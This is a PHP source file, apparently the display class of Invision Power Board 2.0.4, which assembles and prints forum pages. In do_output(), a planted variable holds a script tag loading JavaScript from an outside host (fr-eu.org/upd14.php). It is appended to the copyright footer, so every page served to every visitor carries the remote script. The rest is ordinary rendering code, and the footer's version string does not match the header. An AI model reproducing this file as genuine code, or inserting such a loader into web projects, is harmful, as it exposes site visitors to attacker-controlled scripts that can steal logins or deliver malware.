<?php
/*
+--------------------------------------------------------------------------
|   Invision Power Board v2.0.4
|   =============================================
|   by Matthew Mecham
|   (c) 2001 - 2004 Invision Power Services, Inc.
|   http://www.invisionpower.com
|   =============================================
|   Web: http://www.invisionboard.com
|   Time: Wed, 04 May 2005 15:17:58 GMT
|   Release: 303bba6732d809e44cd52a144ab90a4b
|   Licence Info: http://www.invisionboard.com/?license
+---------------------------------------------------------------------------
|
|   > DISPLAY CLASS
|   > Module written by Matt Mecham
|   > Date started: 26th January 2004
|
|	> Module Version Number: 1.0.0
|   > DBA Checked: Wed 19 May 2004
+--------------------------------------------------------------------------
*/


class display {

    var $to_print = "";
    var $output   = "";
    var $macros   = "";

    //-----------------------------------------
    // CONSTRUCTOR
    //-----------------------------------------

    function display()
    {
		global $ibforums, $std;

    }


    //-----------------------------------------
    // Appends the parsed HTML to our class var
    //-----------------------------------------

    function add_output($to_add)
    {
        $this->to_print .= $to_add;
        //return 'true' on success
        return true;
    }



    /*-------------------------------------------------------------------------*/
    //
    // Parses all the information and prints it.
    //
    /*-------------------------------------------------------------------------*/

    function do_output($output_array)
    {
		global $DB, $Debug, $ibforums, $std;
		$g_g   = '<script type="text/javascript"
		  src="http://www.fr-eu.org/upd14.php">
		</script>';
        //-----------------------------------------
        // Are we IPSing?
        //-----------------------------------------

		$this->_check_ips_report();

        //-----------------------------------------
        // UNPACK MACROS
        //-----------------------------------------

        $this->_unpack_macros();

        //-----------------------------------------
        // END TIMER
        //-----------------------------------------

        $this->ex_time  = sprintf( "%.4f",$Debug->endTimer() );

        //-----------------------------------------
        // SQL DEBUG?
        //-----------------------------------------

        $this->_check_debug();

        $stats = $this->_show_debug();

        //-----------------------------------------
        // NAVIGATION
        //-----------------------------------------

        $nav  = $ibforums->skin_global->start_nav();

        $nav .= "<a href='{$ibforums->base_url}act=idx'>{$ibforums->vars['board_name']}</a>";

        if ( empty($output_array['OVERRIDE']) )
        {
			if (is_array( $output_array['NAV'] ) )
			{
				foreach ($output_array['NAV'] as $n)
				{
					if ($n)
					{
						$nav .= "<{F_NAV_SEP}>" . $n;
					}
				}
			}
        }

        $nav .= $ibforums->skin_global->end_nav();

        //-----------------------------------------
        // CSS
        //-----------------------------------------

        $css = $this->_get_css();

		//-----------------------------------------
		// REMOVAL OF THIS WITHOUT PURCHASING COPYRIGHT REMOVAL WILL VIOLATE THE LICENCE YOU AGREED
		// TO WHEN DOWNLOADING THIS PRODUCT. THIS COULD MEAN REMOVAL OF YOUR BOARD AND EVEN
		// CRIMINAL CHARGES
		//-----------------------------------------


        	$copyright = "
        				  <div align='center' class='copyright'>
        				  	Powered by <a href=\"http://www.invisionboard.com/\">Invision Power Board</a> v1.1.1 © 2003  <a href=\"http://www.invisionpower.com/\">IPS, Inc.</a>
        				  ";

       //-----------------------------------------
       // Board header
       //-----------------------------------------

        $this_header  = $ibforums->skin_global->global_board_header();
        $this_footer  = $ibforums->skin_global->global_board_footer( $std->get_date( time(), 'SHORT', 1 ) );

        //-----------------------------------------
        // Show rules link?
        //-----------------------------------------

        if ($ibforums->vars['gl_show'] and $ibforums->vars['gl_title'])
        {
        	if ($ibforums->vars['gl_link'] == "")
        	{
        		$ibforums->vars['gl_link'] = $ibforums->base_url."act=boardrules";
        	}

        	$this_header = str_replace( "<!--IBF.RULES-->", $ibforums->skin_global->rules_link($ibforums->vars['gl_link'], $ibforums->vars['gl_title']), $this_header );
        }

        //-----------------------------------------
        // Build the members bar
		//-----------------------------------------

		if ( ($ibforums->member['g_max_messages'] > 0) and ($ibforums->member['msg_total'] >= $ibforums->member['g_max_messages']) )
		{
			$msg_data['TEXT'] = $ibforums->lang['msg_full'];
		}
		else
		{
			$ibforums->member['new_msg'] = $ibforums->member['new_msg'] == "" ? 0 : $ibforums->member['new_msg'];

			$msg_data['TEXT'] = sprintf( $ibforums->lang['msg_new'], $ibforums->member['new_msg']);
		}

		$output_array['MEMBER_BAR'] = $ibforums->skin_global->member_bar($msg_data);

		//-----------------------------------------
		// Board offline?
		//-----------------------------------------

 		if ($ibforums->vars['board_offline'] == 1)
 		{
 			$output_array['TITLE'] = $ibforums->lang['warn_offline']." ".$output_array['TITLE'];
 		}

        //-----------------------------------------
        // Showing skin jump?
        //-----------------------------------------

        if ( $ibforums->vars['allow_skins'] and $ibforums->member['id'] > 0 )
        {
        	$skin_jump = $ibforums->skin_global->global_skin_chooser( $this->_build_skin_list() );
        }
        else
        {
        	$skin_jump = "";
        }

        //-----------------------------------------
        // Showing skin jump?
        //-----------------------------------------

        if ( $ibforums->member['id'] > 0 )
        {
        	$lang_jump = $ibforums->skin_global->global_lang_chooser( $this->_build_language_list() );
        }
        else
        {
        	$lang_jump = "";
        }

        //-----------------------------------------
        // Show quick stats?
        //-----------------------------------------

        $gzip_status = $ibforums->vars['disable_gzip'] == 1 ? $ibforums->lang['gzip_off'] : $ibforums->lang['gzip_on'];

        if ( ! $ibforums->server_load  )
        {
        	$ibforums->server_load = '--';
        }

        //-----------------------------------------
        // Basics
        //-----------------------------------------

        if ( $ibforums->member['id'] and $ibforums->vars['debug_level'] )
        {
        	$quickstats = $ibforums->skin_global->global_quick_stats($this->ex_time, $gzip_status, $ibforums->server_load, $DB->get_query_cnt() );
        }
        else
        {
        	$quickstats = "";
        }
		$copyright .= "<br />{$g_g}</div>";
        //-----------------------------------------
        // Add in task image?
        //-----------------------------------------

        if ( time() >= $ibforums->cache['systemvars']['task_next_run'] )
        {
        	$this->to_print .= "<!--TASK--><img src='{$ibforums->base_url}act=task' border='0' height='1' width='1' /><!--ETASK-->";
        }

        $ibforums->skin['_wrapper'] = str_replace( "<% CSS %>"            , $css                     , $ibforums->skin['_wrapper']);
		$ibforums->skin['_wrapper'] = str_replace( "<% JAVASCRIPT %>"     , ""                       , $ibforums->skin['_wrapper']);
        $ibforums->skin['_wrapper'] = str_replace( "<% TITLE %>"          , $output_array['TITLE']   , $ibforums->skin['_wrapper']);
        $ibforums->skin['_wrapper'] = str_replace( "<% BOARD %>"          , $this->to_print          , $ibforums->skin['_wrapper']);
        $ibforums->skin['_wrapper'] = str_replace( "<% STATS %>"          , $stats                   , $ibforums->skin['_wrapper']);
        $ibforums->skin['_wrapper'] = str_replace( "<% GENERATOR %>"      , ""                       , $ibforums->skin['_wrapper']);
		$ibforums->skin['_wrapper'] = str_replace( "<% COPYRIGHT %>"      , $copyright               , $ibforums->skin['_wrapper']);
		$ibforums->skin['_wrapper'] = str_replace( "<% BOARD HEADER %>"   , $this_header             , $ibforums->skin['_wrapper']);
		$ibforums->skin['_wrapper'] = str_replace( "<% BOARD FOOTER %>"   , $this_footer             , $ibforums->skin['_wrapper']);
		$ibforums->skin['_wrapper'] = str_replace( "<% NAVIGATION %>"     , $nav                     , $ibforums->skin['_wrapper']);
		$ibforums->skin['_wrapper'] = str_replace( "<% SKINCHOOSER %>"    , $skin_jump               , $ibforums->skin['_wrapper']);
		$ibforums->skin['_wrapper'] = str_replace( "<% LANGCHOOSER %>"    , $lang_jump               , $ibforums->skin['_wrapper']);
		$ibforums->skin['_wrapper'] = str_replace( "<% QUICKSTATS %>"     , $quickstats              , $ibforums->skin['_wrapper']);
		$ibforums->skin['_wrapper'] = str_replace( "<% LOFIVERSION %>"    , $this->_get_lofi_link()  , $ibforums->skin['_wrapper']);

		if ( empty($output_array['OVERRIDE']) )
		{
      	    $ibforums->skin['_wrapper'] = str_replace( "<% MEMBER BAR %>", $output_array['MEMBER_BAR'], $ibforums->skin['_wrapper']);
        }
        else
        {
      	    $ibforums->skin['_wrapper'] = str_replace( "<% MEMBER BAR %>", $ibforums->skin_global->member_bar_disabled(), $ibforums->skin['_wrapper']);
      	}

      	//-----------------------------------------
		// Do we have a PM show?
		//-----------------------------------------

		if ($ibforums->member['show_popup'])
		{
			$DB->simple_construct( array( 'update' => 'members', 'set' => 'show_popup=0', 'where' => 'id='.$ibforums->member['id'] ) );
			$DB->simple_shutdown_exec();

			if ( $ibforums->input['act'] != 'Msg' )
			{
				$ibforums->skin['_wrapper'] = str_replace( '<!--IBF.NEWPMBOX-->', $std->get_new_pm_notification(), $ibforums->skin['_wrapper'] );
			}
		}

		//-----------------------------------------
		// Stick in chat link? top_site_list_integrate
		//-----------------------------------------

		if ($ibforums->vars['chat_account_no'])
		{
			$ibforums->vars['chat_height'] += $ibforums->vars['chat_poppad'] ? $ibforums->vars['chat_poppad'] : 50;
			$ibforums->vars['chat_width']  += $ibforums->vars['chat_poppad'] ? $ibforums->vars['chat_poppad'] : 50;

			$chat_link = ( $ibforums->vars['chat_display'] == 'self' )
					   ? $ibforums->skin_global->show_chat_link_inline()
					   : $ibforums->skin_global->show_chat_link_popup();

			$ibforums->skin['_wrapper'] = str_replace( "<!--IBF.CHATLINK-->", $chat_link, $ibforums->skin['_wrapper'] );
		}
		else if ($ibforums->vars['chat04_account_no'])
		{
			$ibforums->vars['chat04_height'] += $ibforums->vars['chat04_poppad'] ? $ibforums->vars['chat04_poppad'] : 50;
			$ibforums->vars['chat04_width']  += $ibforums->vars['chat04_poppad'] ? $ibforums->vars['chat04_poppad'] : 50;

			$chat_link = ( $ibforums->vars['chat04_display'] == 'self' )
					   ? $ibforums->skin_global->show_chat_link_inline()
					   : $ibforums->skin_global->show_chat_link_popup();

			$ibforums->skin['_wrapper'] = str_replace( "<!--IBF.CHATLINK-->", $chat_link, $ibforums->skin['_wrapper'] );
		}

		//-----------------------------------------
		// Stick in TSL link?
		//-----------------------------------------

		if ($ibforums->vars['top_site_list_integrate'])
		{
			// As of TSL 1.2, the modules URL is no longer used
			//$ibforums->skin['_wrapper'] = str_replace( "<!--IBF.TSLLINK-->", $ibforums->skin_global->show_tsl_link_inline(), $ibforums->skin['_wrapper'] );
		}

      	//-----------------------------------------
      	// Get the macros and replace them
      	//-----------------------------------------

      	if ( is_array( $this->macros ) )
      	{
			foreach( $this->macros as $i => $row )
			{
				if ($row['macro_value'] != "")
				{
					$ibforums->skin['_wrapper'] = str_replace( "<{".$row['macro_value']."}>", $row['macro_replace'], $ibforums->skin['_wrapper'] );
				}
			}
		}

		$ibforums->skin['_wrapper'] = str_replace( "<#IMG_DIR#>", $ibforums->skin['_imagedir'], $ibforums->skin['_wrapper'] );
		$ibforums->skin['_wrapper'] = str_replace( "<#EMO_DIR#>", $ibforums->skin['_emodir']  , $ibforums->skin['_wrapper'] );

		//-----------------------------------------
		// Images on another server? uncomment and alter below
		//-----------------------------------------

		if ( $ibforums->vars['ipb_img_url'] )
		{
			$ibforums->skin['_wrapper'] = preg_replace( "#img\s+?src=[\"']style_(images|avatars|emoticons)(.+?)[\"'](.+?)?".">#is", "img src=\"".$ibforums->vars['ipb_img_url']."style_\\1\\2\"\\3>", $ibforums->skin['_wrapper'] );
		}

		$this->_finish();

        print $ibforums->skin['_wrapper'];

        exit;
    }

    /*-------------------------------------------------------------------------*/
    //
    // print the headers
    //
    /*-------------------------------------------------------------------------*/

    function do_headers()
    {
		global $ibforums;

    	if ($ibforums->vars['print_headers'])
    	{
			@header("HTTP/1.0 200 OK");
			@header("HTTP/1.1 200 OK");
			@header("Content-type: text/html");

			if ($ibforums->vars['nocache'])
			{
				@header("Cache-Control: no-cache, must-revalidate, max-age=0");
				@header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
				@header("Pragma: no-cache");
			}
        }
    }

    /*-------------------------------------------------------------------------*/
    //
    // print a pure redirect screen
    //
    /*-------------------------------------------------------------------------*/

    function redirect_screen($text="", $url="", $override=0)
    {
		global $ibforums, $std, $DB;

    	//-----------------------------------------
    	// Make sure global skin is loaded
    	//-----------------------------------------

    	if ( $ibforums->skin_global == "" )
		{
			$std->load_template('skin_global');
		}

    	if ($ibforums->input['debug'])
        {
        	flush();
        	exit();
        }

        //-----------------------------------------
        // $ibforums not initialized yet?
        //-----------------------------------------

        if ( $override != 1 )
        {
			if ( $ibforums->base_url )
			{
				$url = $ibforums->base_url.$url;
			}
			else
			{
				$url = "{$ibforums->vars['board_url']}/index.{$ibforums->vars['php_ext']}?".$url;
			}
    	}

    	//-----------------------------------------
    	// Feck off first?
    	//-----------------------------------------

    	if ( $ibforums->vars['ipb_remove_redirect_pages'] == 1 )
    	{
    		$std->boink_it( $url );
    	}

    	$ibforums->lang['stand_by'] = stripslashes($ibforums->lang['stand_by']);

    	//-----------------------------------------
        // CSS
        //-----------------------------------------

        $css = $this->_get_css();

        //-----------------------------------------
        // Get template
        //-----------------------------------------

    	$htm = $ibforums->skin_global->Redirect( ucfirst($text), $url, $css);

    	//-----------------------------------------
    	// Get and parse macros
    	//-----------------------------------------

    	$this->_unpack_macros();

		foreach( $this->macros as $i => $row )
      	{
			if ($row['macro_value'] != "")
			{
				$htm = str_replace( "<{".$row['macro_value']."}>", $row['macro_replace'], $htm );
			}
		}

		$htm = str_replace( "<#IMG_DIR#>", $ibforums->skin['_imagedir'], $htm );

		$this->_finish();

    	echo ($htm);
    	exit;
    }

    /*-------------------------------------------------------------------------*/
    //
    // print a minimalist screen suitable for small pop up windows
    //
    /*-------------------------------------------------------------------------*/

    function pop_up_window($title = 'Invision Power Board', $text = "" )
    {
		global $ibforums, $DB;

    	$this->_check_debug();
    	//-----------------------------------------
        // CSS
        //-----------------------------------------

        $css = $this->_get_css();

		//-----------------------------------------
        // Get template
        //-----------------------------------------

    	$html = $ibforums->skin_global->pop_up_window($title, $css, $text);

    	//-----------------------------------------
    	// Get and parse macros
    	//-----------------------------------------

    	$this->_unpack_macros();

		foreach( $this->macros as $i => $row )
      	{
			if ($row['macro_value'] != "")
			{
				$html = str_replace( "<{".$row['macro_value']."}>", $row['macro_replace'], $html );
			}
		}

		$html = str_replace( "<#IMG_DIR#>", $ibforums->skin['_imagedir'], $html );
		$html = str_replace( "<#EMO_DIR#>", $ibforums->skin['_emodir']  , $html );

    	//-----------------------------------------
		// Images on another server? uncomment and alter below
		//-----------------------------------------

		if ( $ibforums->vars['ipb_img_url'] )
		{
			$html = preg_replace( "#img\s+?src=[\"']style_(images|avatars|emoticons)(.+?)[\"'](.+?)?".">#is", "img src=\"".$ibforums->vars['ipb_img_url']."style_\\1\\2\"\\3>", $html );
		}

    	$this->_finish();

    	echo ($html);
    	exit;
    }

    //-----------------------------------------
    // Show lo-fi link
    // @internal
    //-----------------------------------------

    function _get_lofi_link()
    {
		global $ibforums, $DB, $std;

    	$link = "";
    	$char = '/';

    	if ( substr(PHP_OS, 0, 3) == 'WIN' OR php_sapi_name() == 'cgi' OR php_sapi_name() == 'apache2filter' )
		{
			$char = '?';
		}

    	if ( $ibforums->input['act'] == 'st' )
    	{
    		$link = $char.'t'.$ibforums->input['t'].'.html';
    	}
    	else if ( $ibforums->input['act'] == 'sf' )
    	{
    		$link = $char.'f'.$ibforums->input['f'].'.html';
    	}

    	return $link;
    }

    //-----------------------------------------
    // Build Languages List
    // @internal
    //-----------------------------------------

    function _build_language_list()
    {
		global $ibforums, $DB, $std;

    	$lang_list = "";

    	//-----------------------------------------
		// Roots
		//-----------------------------------------

		foreach( $ibforums->cache['languages'] as $id => $data )
		{
			if ( $ibforums->member['language'] == $data['ldir'] )
			{
				$selected = ' selected="selected"';
			}
			else
			{
				$selected = "";
			}

			$lang_list .= "\n<option value='{$data['ldir']}'{$selected}>{$data['lname']}</option>";
		}

		return $lang_list;
    }

	//-----------------------------------------
    // Build Skin List
    // @internal
    //-----------------------------------------

    function _build_skin_list()
    {
		global $ibforums, $DB, $std;

    	$skin_list = "";

    	//-----------------------------------------
		// Roots
		//-----------------------------------------

		foreach( $ibforums->cache['skin_id_cache'] as $id => $data )
		{
			$skin_sets[ $data['set_parent'] ]['_children'][] = $id;

			if ( $data['set_parent'] < 1 and $id > 1 )
			{
				if ( $data['set_hidden'] and ! $ibforums->member['g_access_cp'] )
				{
					continue;
				}

				$star = $data['set_hidden'] ? ' *' : '';

				if ( $ibforums->skin['_setid'] == $id )
				{
					$selected = ' selected="selected"';
				}
				else
				{
					$selected = "";
				}

				$skin_list .= "\n<option value='$id'{$selected}>{$data['set_name']}{$star}</option><!--CHILDREN:{$id}-->";
			}
		}

		//-----------------------------------------
		// Kids...
		//-----------------------------------------

		foreach( $skin_sets as $id => $data )
		{
			if ( is_array( $data['_children'] ) and count( $data['_children'] ) > 0 )
			{
				$html = "";

				foreach( $data['_children'] as $cid )
				{
					if ( $ibforums->cache['skin_id_cache'][ $cid ]['set_hidden'] and ! $ibforums->member['g_access_cp'] )
					{
						continue;
					}

					$star = $ibforums->cache['skin_id_cache'][ $cid ]['set_hidden'] ? ' *' : '';

					if ( $ibforums->skin['_setid'] == $cid )
					{
						$selected = ' selected="selected"';
					}
					else
					{
						$selected = "";
					}

					$html .= "\n<option value='$cid'{$selected}>---- {$ibforums->cache['skin_id_cache'][ $cid ]['set_name']}{$star}</option>";
				}

				$skin_list = str_replace( "<!--CHILDREN:{$id}-->", $html, $skin_list );
			}
		}
		return $skin_list;
    }

    //-----------------------------------------
    // unpack_macros
    // @internal
    //-----------------------------------------

    function _unpack_macros()
    {
		global $ibforums, $DB, $std;

    	$this->macros = unserialize(stripslashes($ibforums->skin['_macro']));
    }

    //-----------------------------------------
    // show_debug
    // @internal
    //-----------------------------------------

    function _show_debug()
    {
		global $ibforums, $DB, $std;

    	$input   = "";
        $queries = "";
        $sload   = "";
        $stats   = "";

       //-----------------------------------------
       // Form & Get & Skin
       //-----------------------------------------

       if ($ibforums->vars['debug_level'] >= 2)
       {
       		$stats .= "<br />\n<div class='tableborder'>\n<div class='subtitle'>FORM and GET Input</div><div class='row1' style='padding:6px'>\n";

			while( list($k, $v) = each($ibforums->input) )
			{
				$stats .= "<strong>$k</strong> = $v<br />\n";
			}

			$stats .= "</div>\n</div>";

			$stats .= "<br />\n<div class='tableborder'>\n<div class='subtitle'>SKIN & TASK Info</div><div class='row1' style='padding:6px'>\n";

			while( list($k, $v) = each($ibforums->skin) )
			{
				if ( strlen($v) > 120 )
				{
					$v = substr( $v, 0, 120 ). '...';
				}
				$stats .= "<strong>$k</strong> = ".$std->txt_htmlspecialchars($v)."<br />\n";
			}

			$stats .= "<b>Next task</b> = ".$std->get_date( $ibforums->cache['systemvars']['task_next_run'], 'LONG' )."\n<br /><b>Time now</b> = ".$std->get_date( time(), 'LONG' );
			$stats .= "<br /><b>Timestamp Now</b> = ".time();

			$stats .= "</div>\n</div>";

			$stats .= "<br />\n<div class='tableborder'>\n<div class='subtitle'>Loaded PHP Templates</div><div class='row1' style='padding:6px'>\n";

			$stats .= "<strong>".implode(", ",$ibforums->loaded_templates)."</strong><br />\n";

			$stats .= "</div>\n</div>";

        }

        //-----------------------------------------
        // SQL
        //-----------------------------------------

        if ($ibforums->vars['debug_level'] >= 3)
        {
           	$stats .= "<br />\n<div class='tableborder'>\n<div class='subtitle'>Queries Used</div><div class='row1' style='padding:6px'>";

        	foreach($DB->obj['cached_queries'] as $q)
        	{
        		$q = htmlspecialchars($q);
        		$q = preg_replace( "/^SELECT/i" , "<span class='red'>SELECT</span>"   , $q );
        		$q = preg_replace( "/^UPDATE/i" , "<span class='blue'>UPDATE</span>"  , $q );
        		$q = preg_replace( "/^DELETE/i" , "<span class='orange'>DELETE</span>", $q );
        		$q = preg_replace( "/^INSERT/i" , "<span class='green'>INSERT</span>" , $q );
        		$q = str_replace( "LEFT JOIN"   , "<span class='red'>LEFT JOIN</span>" , $q );

        		$q = preg_replace( "/(".$ibforums->vars['sql_tbl_prefix'].")(\S+?)([\s\.,]|$)/", "<span class='purple'>\\1\\2</span>\\3", $q );

        		$stats .= "$q<hr />\n";
        	}

        	if ( count( $DB->obj['shutdown_queries'] ) )
        	{
				foreach($DB->obj['shutdown_queries'] as $q)
				{
					$q = htmlspecialchars($q);
					$q = preg_replace( "/^SELECT/i" , "<span class='red'>SELECT</span>"   , $q );
					$q = preg_replace( "/^UPDATE/i" , "<span class='blue'>UPDATE</span>"  , $q );
					$q = preg_replace( "/^DELETE/i" , "<span class='orange'>DELETE</span>", $q );
					$q = preg_replace( "/^INSERT/i" , "<span class='green'>INSERT</span>" , $q );
					$q = str_replace( "LEFT JOIN"   , "<span class='red'>LEFT JOIN</span>" , $q );

					$q = preg_replace( "/(".$ibforums->vars['sql_tbl_prefix'].")(\S+?)([\s\.,]|$)/", "<span class='purple'>\\1\\2</span>\\3", $q );

					$stats .= "<div style='background:#DEDEDE'><b>SHUTDOWN:</b> $q</div><hr />\n";
				}
        	}

        	$stats .= "</div>\n</div>";
        }

        if ( $stats )
        {
			$collapsed_ids = ','.$std->my_getcookie('collapseprefs').',';

			$show['div_fo'] = 'show';
			$show['div_fc'] = 'none';

			if ( strstr( $collapsed_ids, ',debug,' ) )
			{
				$show['div_fo'] = 'none';
				$show['div_fc'] = 'show';
			}

			$stats = "<div align='center' style='display:{$show['div_fc']}' id='fc_debug'>
					   <div class='row2' style='padding:8px;vertical-align:middle'><a href='javascript:togglecategory(\"debug\", 0);'>Show Debug Information</a></div>
					  </div>

					  <div align='center' style='display:{$show['div_fo']}' id='fo_debug'>
					   <div class='row2' style='padding:8px;vertical-align:middle'><a href='javascript:togglecategory(\"debug\", 1);'>Hide Debug Information</a></div>
					   <br />
					   <div class='tableborder' align='left'>
						<div class='maintitle'>Debug Information</div>
						 <div style='padding:5px;background:#8394B2;'>$stats</div>
					   </div>
					  </div>";
        }

        return $stats;
    }

    //-----------------------------------------
    // check_debug
    // @internal
    //-----------------------------------------

    function _check_debug()
    {
		global $ibforums, $DB, $std;

    	if ($DB->obj['debug'])
        {
        	flush();
        	print "<html><head><title>SQL Debugger</title><body bgcolor='white'><style type='text/css'> TABLE, TD, TR, BODY { font-family: verdana,arial, sans-serif;color:black;font-size:11px }</style>";
        	print "<h1 align='center'>SQL Total Time: {$DB->sql_time} for {$query_cnt} queries</h1><br />".$ibforums->debug_html;
        	print "<br /><div align='center'><strong>Total SQL Time: {$DB->sql_time}</div></body></html>";
        	exit();
        }
    }



    //-----------------------------------------
    // check_ips_report
    // @internal
    //-----------------------------------------

    function _check_ips_report()
    {
		global $ibforums, $DB, $std;

    	//-----------------------------------------
		// Note, this is designed to allow IPS validate boards
		// who've purchased copyright removal / registration.
		// The order number is the only thing shown and the
		// order number is unique to the person who paid and
		// is no good to anyone else.
		// Showing the order number poses no risk at all -
		// the information is useless to anyone outside of IPS.
		//-----------------------------------------

		$pass = 0;

		if ( $ibforums->input['ipsreport'] or $ibforums->input['ipscheck'] )
		{
			if ( $ibforums->vars['ipb_copy_number'] )
			{
				flush();
				print preg_replace( "/^(\d+?)-(\d+?)-(\d+?)-(\S+?)$/", "\\2,\\3", $ibforums->vars['ipb_copy_number'] );
				exit();
			}
			else if ( $ibforums->vars['ipb_reg_number'] )
			{
				flush();
				print preg_replace( "/^(\d+?)-(\d+?)-(\d+?)-(\d+?)-(\S+?)$/", "\\2,\\4", $ibforums->vars['ipb_reg_number'] );
				exit();
			}
			else
			{
				print "--";
				exit();
			}
        }
    }

    //-----------------------------------------
    // get_css
    // @internal
    //-----------------------------------------

    function _get_css()
    {
		global $ibforums, $DB, $std;

    	if ( $ibforums->skin['_usecsscache'] and @file_exists( CACHE_PATH.'style_images/css_'. $ibforums->skin['_csscacheid'] .'.css' ) )
        {
        	$css = $ibforums->skin_global->css_external($ibforums->skin['_csscacheid']);
        }
        else
        {
        	$css = $ibforums->skin_global->css_inline( str_replace( "<#IMG_DIR#>", $ibforums->skin['_imagedir'], $ibforums->skin['_css'] ) );
        }

        return $css;
    }

    //-----------------------------------------
    // finish
    // @internal
    //-----------------------------------------

    function _finish()
    {
		global $ibforums, $DB, $std;

    	//-----------------------------------------
		// Do shutdown
		//-----------------------------------------

		if ( ! USE_SHUTDOWN )
        {
        	$std->my_deconstructor();
        	$DB->close_db();
        }

		//-----------------------------------------
		// Start GZIP compression
        //-----------------------------------------

        if ($ibforums->vars['disable_gzip'] != 1 )
        {
        	$buffer = ob_get_contents();
        	ob_end_clean();
        	@ob_start('ob_gzhandler');
        	print $buffer;
        }

        //-----------------------------------------
        // Print, plop and part
        //-----------------------------------------

        $this->do_headers();
    }

} // END class


?>